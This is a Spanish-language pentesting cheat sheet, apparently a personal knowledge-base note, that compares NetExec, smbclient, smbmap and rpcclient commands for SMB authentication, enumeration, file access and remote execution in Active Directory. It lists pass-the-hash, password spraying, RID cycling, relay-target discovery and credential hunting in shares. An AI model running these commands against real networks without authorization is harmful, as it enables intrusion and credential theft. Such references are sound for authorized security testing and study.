---
tipo: meta
aliases:
  - SMB - matriz
  - smb cheatsheet
  - nxc smb
tags:
  - meta/referencia
  - dominio/ad
---

# SMB - matriz de referencia

> [!info] Referencia pura, no un zettel
> Las cuatro herramientas —`nxc smb` (NetExec), `smbclient`, `smbmap`, `rpcclient`— comparadas en grid por tarea. El criterio vive en [[SMB]] y [[MOC - AD enumeración]]; la teoría, en [[SMB - dialectos y firma]] y [[SMB - sesión nula e IPC$]]. Ejecución remota (psexec/smbexec): [[AD movimiento lateral - matriz de referencia]].

> [!warning] Cuadros anchos a propósito
> Los grid de esta nota superan el ancho de la ventana. Es la comparación lado a lado pedida; scrolleá horizontal o apagá el ajuste con `<leader>uw`.

`HOST`, `u`, `p` son marcadores del objetivo y la credencial. `—` = la herramienta no hace esa tarea.

## Autenticar

| Forma | nxc smb | smbclient | smbmap | rpcclient |
|---|---|---|---|---|
| Sesión nula | `nxc smb HOST -u '' -p ''` | `smbclient -L //HOST/ -N` | `smbmap -H HOST -u '' -p ''` | `rpcclient -U '' -N HOST` |
| Usuario/contraseña | `nxc smb HOST -u u -p p` | `smbclient //HOST/share -U 'DOM\u%p'` | `smbmap -H HOST -u u -p p -d DOM` | `rpcclient -U 'DOM\u%p' HOST` |
| Pass-the-hash | `nxc smb HOST -u u -H LM:NT` | `smbclient //HOST/share -U u --pw-nt-hash NT` | `smbmap -H HOST -u u -p 'LM:NT'` | `rpcclient -U u --pw-nt-hash NT HOST` |
| Kerberos | `nxc smb HOST -u u -k` | `smbclient //HOST/share -k` | `smbmap -H HOST -k` | `rpcclient -k HOST` |

## Comprobar host, firma y dialecto

Solo `nxc`; las otras tres no reportan la firma.

| Tarea | nxc smb |
|---|---|
| Barrido (versión + firma) | `nxc smb 10.0.0.0/24` |
| Lista de hosts sin firma | `nxc smb 10.0.0.0/24 --gen-relay-list objetivos.txt` |

`signing:False` marca candidato a relay ([[Relay de NTLM]]).

## Enumerar

| Tarea | nxc smb | smbclient | smbmap | rpcclient |
|---|---|---|---|---|
| Listar shares | `nxc smb HOST -u u -p p --shares` | `smbclient -L //HOST/ -U u%p` | `smbmap -H HOST -u u -p p` | `rpcclient -U u%p HOST -c netshareenumall` |
| Usuarios | `nxc smb HOST -u u -p p --users` | — | — | `rpcclient -U u%p HOST -c enumdomusers` |
| Grupos | `nxc smb HOST -u u -p p --groups` | — | — | `rpcclient -U u%p HOST -c enumdomgroups` |
| Política de contraseñas | `nxc smb HOST -u u -p p --pass-pol` | — | — | `rpcclient -U u%p HOST -c getdompwinfo` |
| Usuarios conectados | `nxc smb HOST -u u -p p --loggedon-users` | — | — | — |
| RID cycling | `nxc smb HOST -u guest -p '' --rid-brute 10000` | — | — | `rpcclient -U u%p HOST -c 'queryuser 0xRID'` |

`smbmap` y `smbclient` no enumeran el directorio; su terreno son los shares y los archivos.

## Archivos

En `smbclient` los verbos van dentro de la sesión (`smbclient //HOST/share -U u%p`, luego el comando).

| Tarea | nxc smb | smbclient | smbmap | rpcclient |
|---|---|---|---|---|
| Navegar recursivo | `nxc smb HOST -u u -p p -M spider_plus` | `recurse ON; ls` | `smbmap -H HOST -u u -p p -R 'share'` | — |
| Descargar | `nxc smb HOST -u u -p p --get-file '\ruta' out` | `get archivo` | `smbmap -H HOST -u u -p p --download 'share\ruta'` | — |
| Descarga masiva | `-M spider_plus -o DOWNLOAD_FLAG=True` | `prompt OFF; recurse ON; mget *` | `-R 'share' -A 'patrón'` | — |
| Subir | `nxc smb HOST -u u -p p --put-file local '\share\rem'` | `put local rem` | `smbmap -H HOST -u u -p p --upload local 'share\rem'` | — |

`smbmap -A 'patrón'` baja los archivos cuyo contenido matchea — la búsqueda de credenciales en shares.

## Ejecutar y spray

Terreno de `nxc` (requiere admin para exec). Para psexec/smbexec/wmiexec: [[AD movimiento lateral - matriz de referencia]].

| Tarea | nxc smb |
|---|---|
| Comando (cmd) | `nxc smb HOST -u u -p p -x 'whoami /all'` |
| Comando (powershell) | `nxc smb HOST -u u -p p -X '$PSVersionTable'` |
| Password spraying | `nxc smb HOST -u usuarios.txt -p 'Verano2026!' --continue-on-success` |
| Pares usuario:pass 1 a 1 | `nxc smb HOST -u usuarios.txt -p pass.txt --no-bruteforce` |

## rpcclient — consultas puntuales de RPC

Dentro de una sesión (`rpcclient -U u%p HOST`), o con `-c 'comando'`:

| Comando | Qué da |
|---|---|
| `srvinfo` | Versión y rol del servidor |
| `enumdomains` · `lsaquery` | Dominios y SID del dominio |
| `lsaenumsid` | SIDs conocidos por la LSA |
| `queryuser 0xRID` | Detalle de un usuario |
| `querygroupmem 0xRID` | Miembros de un grupo |
| `enumprivs` | Privilegios definidos |

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| `STATUS_ACCESS_DENIED` al listar | sesión nula cerrada / sin permiso | probar `guest`, o credencial |
| `NT_STATUS_LOGON_FAILURE` | credencial o formato de hash mal | hash como `LM:NT`, o `--pw-nt-hash` |
| smbclient: `protocol negotiation failed` | server exige SMB2+, cliente ofrece SMB1 | `-m SMB3` |
| `NT_STATUS_MORE_PROCESSING_REQUIRED` (kerberos) | reloj desfasado con el DC | sincronizar hora (`ntpdate`/`faketime`) |
| RID cycling vacío | anónimo restringido | usar credencial de dominio cualquiera |
